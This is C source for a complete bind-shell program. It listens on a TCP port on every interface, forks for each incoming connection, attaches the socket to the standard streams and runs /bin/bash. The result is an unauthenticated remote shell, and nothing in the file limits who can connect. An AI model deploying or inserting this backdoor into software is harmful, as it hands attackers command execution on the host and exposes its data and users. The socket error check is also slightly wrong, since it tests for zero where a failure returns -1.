#include "config.h"
#include <unistd.h>
#include <sys/socket.h>
#include <error.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char **argv)
{
    int server_socket = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, IPPROTO_TCP);
    if (!server_socket)
        error(EXIT_FAILURE, errno, "socket");

    int opt = 1;
    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
        error(EXIT_FAILURE, errno, "setsockopt");

    struct sockaddr_in addr = 
    {
        .sin_family = AF_INET,
        .sin_port = htons(SERVER_PORT),
        .sin_addr.s_addr = INADDR_ANY,
    };

    if (bind(server_socket, (struct sockaddr *) &addr, sizeof(addr)) < 0)
        error(EXIT_FAILURE, errno, "bind");
    
    if (listen(server_socket, SERVER_BACKLOG) == -1)
        error(EXIT_FAILURE, errno, "listen");
    
    while(1)
    {
        socklen_t socklen = sizeof(addr);
        int client_socket = accept(server_socket, (struct sockaddr *) &addr, &socklen);
        if (client_socket < 0)
            error(EXIT_FAILURE, errno, "accept");

        printf("%s: Accepted connection from %s:%hu\n", argv[0],
               inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));

        switch (fork())
        {
            case -1:
                error(EXIT_FAILURE, errno, "fork");
                break;
            case 0:
                if (dup2(client_socket, STDOUT_FILENO) == -1)
                    error(EXIT_FAILURE, errno, "dup2");
                if (dup2(client_socket, STDIN_FILENO) == -1)
                    error(EXIT_FAILURE, errno, "dup2"); 
                if (dup2(client_socket, STDERR_FILENO) == -1)
                    error(EXIT_FAILURE, errno, "dup2");
                close(client_socket);

                if (execl("/bin/bash", "/bin/bash", (char *) NULL) == -1)
                    error(EXIT_FAILURE, errno, "execve");  
                break;
            default: 
                close(client_socket);
        }
    }

    exit(EXIT_SUCCESS);
}

